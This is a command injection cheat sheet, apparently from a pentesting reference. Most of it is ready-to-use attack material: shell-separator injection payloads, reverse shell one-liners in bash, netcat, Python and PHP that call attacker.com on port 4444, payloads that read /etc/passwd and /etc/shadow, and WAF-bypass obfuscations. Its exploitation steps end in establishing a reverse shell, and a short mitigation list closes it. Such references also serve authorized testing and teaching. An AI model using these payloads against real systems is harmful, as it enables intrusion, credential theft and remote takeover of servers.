Critical Severity

📌 Command Injection

🧠 Description

What is Command Injection?

Command injection allows attackers to execute arbitrary operating system commands on the server. This occurs when user input is passed unsanitized to a system shell.

🎯 Attack Surface

  • ✅ Ping/Hostname lookup tools
  • ✅ File conversion utilities
  • ✅ ZIP/TAR archiving features
  • ✅ System monitoring endpoints

💣 Basic Payloads

; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid
%0a id
🚀 Reverse Shell Payloads
bash -i >& /dev/tcp/attacker.com/4444 0>&1
nc -e /bin/sh attacker.com 4444
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
📁 File Read Payloads
; cat /etc/passwd
| type C:\Windows\win.ini
&& cat /etc/shadow
`cat /etc/hosts`
🛡️ WAF Bypass
%0a cat /etc/passwd
; c${at} /etc/passwd
; c""at /etc/passwd
; c'a't /etc/passwd
; c"a"t /etc/passwd

⚙️ Exploitation Steps

  1. Identify parameter that executes system commands
  2. Test with ; sleep 5 for time delay
  3. Confirm with ; id and check output
  4. Read sensitive files
  5. Establish reverse shell

🛡️ Mitigation

✅ Avoid system() calls with user input
✅ Use language-native APIs instead of shell
✅ Sanitize and validate input strictly
✅ Use allowlist for allowed commands
✅ Run application with least privilege
